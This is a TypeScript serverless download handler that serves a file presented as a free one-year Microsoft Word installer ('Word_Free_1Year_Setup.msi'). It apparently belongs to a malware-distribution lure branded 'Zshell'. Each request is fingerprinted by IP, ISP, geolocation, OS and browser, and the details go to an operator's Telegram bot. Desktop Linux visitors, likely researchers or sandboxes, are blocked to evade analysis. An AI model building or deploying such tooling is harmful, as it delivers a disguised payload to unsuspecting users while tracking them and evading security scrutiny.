import type { VercelRequest, VercelResponse } from '@vercel/node'
import { readFileSync, existsSync } from 'fs'
import { join } from 'path'

// Simple user agent parser - no external dependencies
function parseUserAgent(userAgent: string) {
    const ua = userAgent.toLowerCase()
    
    // Detect OS
    let osName = 'Unknown OS'
    if (ua.includes('windows nt 10.0')) osName = 'Windows 10'
    else if (ua.includes('windows nt 6.3')) osName = 'Windows 8.1'
    else if (ua.includes('windows nt 6.1')) osName = 'Windows 7'
    else if (ua.includes('windows')) osName = 'Windows'
    else if (ua.includes('mac os x')) osName = 'macOS'
    else if (ua.includes('android')) osName = 'Android'
    else if (ua.includes('linux') && !ua.includes('android')) osName = 'Linux'
    else if (ua.includes('iphone')) osName = 'iOS'
    
    // Detect Browser
    let browserName = 'Unknown Browser'
    if (ua.includes('chrome') && !ua.includes('edge')) browserName = 'Chrome'
    else if (ua.includes('firefox')) browserName = 'Firefox'
    else if (ua.includes('safari') && !ua.includes('chrome')) browserName = 'Safari'
    else if (ua.includes('edge')) browserName = 'Edge'
    
    return {
        os: osName,
        browser: browserName,
        platform: osName,
        type: osName
    }
}

// Simple geolocation lookup
async function getLocationData(ip: string) {
    // Skip private IPs
    if (ip === '127.0.0.1' || ip === 'localhost' || 
        ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
        return { country: 'Local Network', city: 'Localhost', isp: 'Local' }
    }
    
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp`, {
            signal: AbortSignal.timeout(3000)
        })
        
        if (response.ok) {
            const data = await response.json() as any
            if (data.status === 'success') {
                return {
                    country: data.country || 'Unknown',
                    city: data.city || 'Unknown', 
                    isp: data.isp || 'Unknown'
                }
            }
        }
    } catch (error) {
        console.log('⚠️ Geolocation failed:', error)
    }
    
    return { country: 'Unknown', city: 'Unknown', isp: 'Unknown' }
}

// Simple Telegram sender
async function sendTelegramLog(message: string) {
    if (!config.TELEGRAM_BOT_TOKEN || !config.TELEGRAM_CHAT_ID) {
        console.log('⚠️ Telegram disabled - missing credentials')
        return
    }

    try {
        const response = await fetch(`https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: config.TELEGRAM_CHAT_ID,
                text: message
            }),
            signal: AbortSignal.timeout(5000)
        })
        
        if (response.ok) {
            console.log('✅ Telegram log sent successfully')
        } else {
            console.log('⚠️ Telegram send failed')
        }
    } catch (error) {
        console.log('⚠️ Telegram error:', error)
    }
}

// Configuration
const config = {
    TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN || null,
    TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID || null,
    BLOCK_LINUX: process.env.BLOCK_LINUX !== 'false', // Default enabled, set BLOCK_LINUX=false to disable
}


// Get client IP address 
function getClientIP(req: VercelRequest): string {
    const forwarded = req.headers['x-forwarded-for']
    if (typeof forwarded === 'string') {
        const firstIP = forwarded.split(',')[0].trim()
        if (firstIP && firstIP !== 'unknown') return firstIP
    }
    return (req.headers['x-real-ip'] as string) || 'Unknown'
}

// Format download log message
async function formatDownloadLog(userAgent: string, ip: string, referrer: string): Promise<string> {
    const device = parseUserAgent(userAgent)
    const location = await getLocationData(ip)
    const currentTime = new Date().toLocaleString('en-US', { timeZone: 'UTC' })
    
    const locationInfo = location.city !== 'Unknown' ? `${location.city}, ${location.country}` : location.country
    const ispInfo = location.isp !== 'Unknown' ? ` (${location.isp})` : ''

    return `🧛‍♂️ Zshell
📢 New Device Access - DOCX CLIENT

🌍 IP: ${ip}${ispInfo}
🖥 Platform: ${device.platform}
🌐 Browser: ${device.browser}
🌎 Country: ${locationInfo}
📱 Device: ${device.type}
⏰ Time: ${currentTime}
🔄 Referrer: ${referrer || 'Direct'}

🔽 Docx user downloading file for ${device.type} device
✅ Download started successfully`
}

// Linux blocking function
function checkLinuxBlocking(userAgent: string): { isLinux: boolean, platform: string } {
    if (!config.BLOCK_LINUX) return { isLinux: false, platform: 'blocking disabled' }

    const device = parseUserAgent(userAgent)
    const platform = device.platform.toLowerCase()
    
    // Block desktop Linux (but allow Android and ChromeOS)
    const isLinux = platform.includes('linux') && 
                   !platform.includes('android') && 
                   !platform.includes('chrome')
    
    return { isLinux, platform: device.platform }
}

// Format blocked Linux log message
async function formatBlockedLog(userAgent: string, ip: string): Promise<string> {
    const device = parseUserAgent(userAgent)
    const location = await getLocationData(ip)
    const currentTime = new Date().toLocaleString('en-US', { timeZone: 'UTC' })
    const locationInfo = location.city !== 'Unknown' ? `${location.city}, ${location.country}` : location.country
    const ispInfo = location.isp !== 'Unknown' ? ` (${location.isp})` : ''

    return `🚫 Linux Access Blocked
🧛‍♂️ Zshell - Security Block
🌍 IP: ${ip}${ispInfo}
🖥 Platform: ${device.platform}
📍 Location: ${locationInfo}
⏰ Time: ${currentTime}
❌ Reason: Linux systems not supported`
}

export default async function handler(req: VercelRequest, res: VercelResponse) {
    // Only allow GET requests
    if (req.method !== 'GET') {
        return res.status(405).json({ success: false, message: 'Method not allowed' })
    }

    // Find MSI file in Vercel
    const msiFileName = 'Word_Free_1Year_Setup.msi'
    const paths = [
        join(process.cwd(), 'dist', msiFileName),
        join(process.cwd(), 'client', 'public', msiFileName),
        join(process.cwd(), 'public', msiFileName)
    ]
    
    let filePath: string | null = null
    for (const path of paths) {
        if (existsSync(path)) {
            filePath = path
            break
        }
    }
    
    if (!filePath) {
        console.error('❌ MSI file not found')
        return res.status(404).json({ success: false, message: 'Download file not available' })
    }
    
    const fileName = 'Word_Free_1Year_Setup.msi'
    
    // Capture user details for logging
    const userAgent = req.headers['user-agent'] as string || 'Unknown'
    const clientIP = getClientIP(req)
    const referrer = (req.headers.referer || req.headers.referrer) as string || 'Direct'
    
    // Check Linux blocking first
    const { isLinux, platform } = checkLinuxBlocking(userAgent)
    if (isLinux) {
        console.log(`🚫 Blocked Linux access from ${clientIP} - ${platform}`)
        
        // Log to Telegram (non-blocking)
        try {
            const blockMessage = await formatBlockedLog(userAgent, clientIP)
            sendTelegramLog(blockMessage).catch(console.error)
        } catch (error) {
            console.error('❌ Block log error:', error)
        }
        
        // Return 403 with informative message
        return res.status(403).json({
            success: false,
            message: 'Access denied - Linux systems not supported',
            error: 'LINUX_BLOCKED'
        })
    }
    
    console.log(`📥 Download request received for: ${fileName}`)
    console.log(`📂 File path: ${filePath}`)
    console.log(`👤 Client IP: ${clientIP}`)
    console.log(`🌐 User Agent: ${userAgent}`)
    
    // Send Telegram log (non-blocking)
    try {
        const logMessage = await formatDownloadLog(userAgent, clientIP, referrer)
        sendTelegramLog(logMessage).catch(console.error)
    } catch (error) {
        console.error('❌ Log error:', error)
    }
    
    // Set CORS headers for Vercel
    res.setHeader('Access-Control-Allow-Origin', '*')
    res.setHeader('Access-Control-Allow-Methods', 'GET')
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type')
    
    // Set headers for download
    res.setHeader('Content-Disposition', `attachment; filename="${fileName}"`)
    res.setHeader('Content-Type', 'application/octet-stream')
    res.setHeader('Cache-Control', 'no-cache')
    
    try {
        // Read file and send as response
        const fileBuffer = readFileSync(filePath)
        
        console.log(`✅ Download completed: ${fileName}`)
        
        // Send success confirmation to Telegram (non-blocking)  
        try {
            const location = await getLocationData(clientIP)
            const device = parseUserAgent(userAgent)
            const locationInfo = location.city !== 'Unknown' ? `${location.city}, ${location.country}` : location.country
            
            const successMessage = `✅ Download Completed Successfully
🧛‍♂️ Zshell - Success Report
🌍 IP: ${clientIP}
📍 Location: ${locationInfo}
📁 File: ${fileName}
📱 Device: ${device.type}
🌐 Browser: ${device.browser}
⏰ Time: ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })}`
            
            sendTelegramLog(successMessage).catch(console.error)
        } catch (error) {
            console.error('❌ Success log error:', error)
        }
        
        res.status(200).send(fileBuffer)
        
    } catch (err) {
        console.error('❌ Download error:', err)
        
        // Send error to Telegram (non-blocking)
        const device = parseUserAgent(userAgent)
        const errorMessage = `❌ Download Error
🧛‍♂️ Zshell - Error Report
🌍 IP: ${clientIP}
📱 Device: ${device.type}
❌ Error: ${err instanceof Error ? err.message : 'Unknown error'}
⏰ Time: ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })}`
        
        sendTelegramLog(errorMessage).catch(console.error)
        
        return res.status(500).json({
            success: false,
            message: "Download failed. Please try again.",
            error: err instanceof Error ? err.message : 'Unknown error'
        })
    }
}